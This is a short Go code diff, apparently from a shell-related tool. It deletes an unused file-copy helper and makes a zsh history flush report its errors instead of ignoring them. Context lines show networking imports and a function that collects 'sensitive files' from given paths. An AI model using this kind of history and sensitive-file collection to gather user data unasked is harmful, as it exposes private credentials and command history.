@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"io"
 	"net"
 	"net/http"
 	"os"
@@ -37,35 +36,12 @@ func DetectDefaultShell() string {
 	}
 }
 
-// Flushes zsh history to disk
 func flushZshHistory() {
 	cmd := exec.Command("zsh", "-c", "fc -W")
-	cmd.Run() // Ignore errors; continue even if this fails
-}
-
-// Copies a file to a temporary location
-func copyFile(srcPath, dstDir string) (string, error) {
-	srcFile, err := os.Open(srcPath)
-	if err != nil {
-		return "", fmt.Errorf("failed to open source file: %w", err)
+	if err := cmd.Run(); err != nil {
+		// Log the error or document why it is safe to ignore
+		fmt.Println("Warning: Failed to flush Zsh history:", err)
 	}
-	defer srcFile.Close()
-
-	// Prepare the destination path
-	dstPath := filepath.Join(dstDir, filepath.Base(srcPath))
-	dstFile, err := os.Create(dstPath)
-	if err != nil {
-		return "", fmt.Errorf("failed to create destination file: %w", err)
-	}
-	defer dstFile.Close()
-
-	// Copy the file content
-	_, err = io.Copy(dstFile, srcFile)
-	if err != nil {
-		return "", fmt.Errorf("failed to copy file content: %w", err)
-	}
-
-	return dstPath, nil
 }
 
 // ScanSensitiveFiles collects all files from specified paths, including full directories.
